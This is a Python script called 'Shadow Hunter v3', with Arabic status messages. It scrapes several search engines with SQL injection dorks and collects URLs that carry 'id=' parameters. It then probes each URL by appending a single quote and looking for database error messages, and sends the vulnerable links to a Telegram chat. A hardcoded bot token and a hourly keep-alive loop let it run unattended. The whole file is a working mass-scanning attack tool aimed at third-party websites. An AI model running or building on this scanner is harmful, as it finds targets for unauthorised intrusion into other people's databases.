# ===============================================
# Shadow Hunter v3 - Final Clean (Render + Pydroid)
# ===============================================

import requests, re, time, random, threading
from urllib.parse import quote_plus, urlparse
from telebot import TeleBot
from flask import Flask

# ------------ Telegram Bot Settings ------------
TOKEN   = "8054578360:AAE4-PAEetO-XSSU3-7cTCEEsGZ0MUOp78w"
CHAT_ID = "7856736153"
bot = TeleBot(TOKEN, threaded=False)

# ------------ Search Engines + Pages ------------
ENGINES = {
    "bing":      "https://www.bing.com/search?q={q}&first={start}",
    "brave":     "https://search.brave.com/search?q={q}&offset={start}",
    "qwant":     "https://www.qwant.com/?q={q}&t=web&offset={start}",
    "swisscows": "https://swisscows.com/en/web?query={q}&page={start}"
}
PAGES_EACH = 60

# ------------ User-Agent Rotation ------------
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/122.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G973F) AppleWebKit/537.36 Chrome/120.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4) AppleWebKit/605.1.15 Mobile/15E148"
]
HEADERS = lambda: {"User-Agent": random.choice(USER_AGENTS)}
sleep_random = lambda a=2.0, b=4.0: time.sleep(random.uniform(a, b))

# ------------ Filters (Strong) ------------
BANNED_DOMAINS = {
    'google','youtube','facebook','linkedin','instagram','microsoft','mozilla',
    'wikipedia','amazon','apple','bing','yahoo','baidu','duckduckgo','tumblr',
    'reddit','netflix','adobe','whatsapp','pinterest','yandex','cloudflare',
    'dropbox','paypal','tiktok','weebly','wix','webnode','github','gitlab',
    'sourceforge','opera','vimeo','blogspot','wordpress','blogger','live.com',
    'msn.com','doubleclick','bbc','cnn','aljazeera','sky.com','forbes','nytimes',
    'reuters','huffpost','stackoverflow','slack.com','zendesk','skype','office.com',
    'zoom','webex','archive.org','tripadvisor','booking.com','airbnb','uber','lyft',
    'spotify','deezer','soundcloud','naver','vk.com','mail.ru','ask.com','aol.com',
    'myspace','quora','slideshare','trello','bitbucket','telegram','discord',
    'notion.so','canva.com','figma.com','coursera','edx.org','udemy','khanacademy',
    'udacity','openai','icloud.com','fast.com','norton','kaspersky','virustotal',
    'gstatic','edge.microsoft.com'
}

BANNED_KEYWORDS = {
    'login','logout','signin','signup','account','profile','register','auth',
    'watch','video','playlist','search','ads','utm_','gclid','fbclid','redirect',
    'rss','feed','comment','sort','filter','json','xml','api','static','assets',
    'cache','blog','tag','category','wordpress','preview','help','support',
    'privacy','terms','contact','about','news','press','careers','jobs','status',
    'feedback','donate','sitemap','cookie','robots'
}

BANNED_EXTS = (
    '.jpg','.jpeg','.png','.svg','.gif','.ico',
    '.css','.js','.woff','.ttf','.eot',
    '.pdf','.doc','.xls','.zip','.rar','.exe',
    '.mp4','.mp3','.avi','.mov'
)

ERROR_SIGNS = (
    'sql syntax','mysql_fetch','you have an error',
    'odbc sql','pdoexception','unclosed quotation'
)

# ------------ Helpers ------------
def is_valid(url: str) -> bool:
    url_l = url.lower()
    if "id=" not in url_l:
        return False
    if any(url_l.endswith(ext) for ext in BANNED_EXTS):
        return False
    if any(k in url_l for k in BANNED_KEYWORDS):
        return False
    net = urlparse(url).netloc.lower()
    if any(dom in net for dom in BANNED_DOMAINS):
        return False
    return True

def load_dorks(path: str = "sqli_dorks.txt") -> list:
    try:
        with open(path, encoding="utf-8") as f:
            return [ln.strip() for ln in f if ln.strip()]
    except FileNotFoundError:
        print("[!] ملف dorks غير موجود.")
        return []

def search_dork(dork: str) -> list:
    q = quote_plus(dork)
    out = []
    for name, tmpl in ENGINES.items():
        for page in range(PAGES_EACH):
            if name == "bing":
                start_val = page * 10 + 1
            elif name == "swisscows":
                start_val = page + 1
            else:
                start_val = page * 10
            url = tmpl.format(q=q, start=start_val)
            sleep_random()
            try:
                html = requests.get(url, headers=HEADERS(), timeout=10).text
                links = re.findall(r'https?://[\w./%-_?=&#+]+', html)
                out.extend(links)
            except Exception as e:
                print(f"[*] {name} خطأ: {e}")
    return out

def test_sqli(url: str) -> bool:
    try:
        r = requests.get(url + "'", headers=HEADERS(), timeout=8)
        return any(sig in r.text.lower() for sig in ERROR_SIGNS)
    except:
        return False

def send_batch_report(batch_id: int, scanned: int, infected_links: list):
    msg = f"🧪 Batch #{batch_id}\nروابط مفحوصة: {scanned}\nمصابة: {len(infected_links)}"
    bot.send_message(CHAT_ID, msg)
    for link in infected_links:
        bot.send_message(CHAT_ID, f"⚠️ SQLi: {link}")

# ------------ Main Routine ------------
def run_cycle():
    dorks = load_dorks()
    if not dorks:
        return
    print("🚀 بدء الجمع …")
    batch_id = 1
    current_pool = []
    for dork in dorks:
        print(f"[+] Dork: {dork}")
        for link in search_dork(dork):
            clean = link.split("&")[0]
            if not is_valid(clean) or clean in current_pool:
                continue
            current_pool.append(clean)
            if len(current_pool) == 30:
                infected = [u for u in current_pool if test_sqli(u)]
                send_batch_report(batch_id, 30, infected)
                batch_id += 1
                current_pool.clear()
    if current_pool:
        infected = [u for u in current_pool if test_sqli(u)]
        send_batch_report(batch_id, len(current_pool), infected)
    bot.send_message(CHAT_ID, "✅ الدورة اكتملت. سأعيد الفحص بعد ساعة.")

# ------------ Flask Keep-alive for Render ------------
app = Flask(__name__)
@app.route('/')
def home():
    return "Shadow Hunter is running..."

# ------------ Start Everything ------------
def start_bot():
    bot.send_message(CHAT_ID, "✅ Shadow Hunter بدأ العمل وهو جاهز للفحص.")
    while True:
        run_cycle()
        time.sleep(3600)

if __name__ == "__main__":
    threading.Thread(target=start_bot).start()
    app.run(host="0.0.0.0", port=8080)
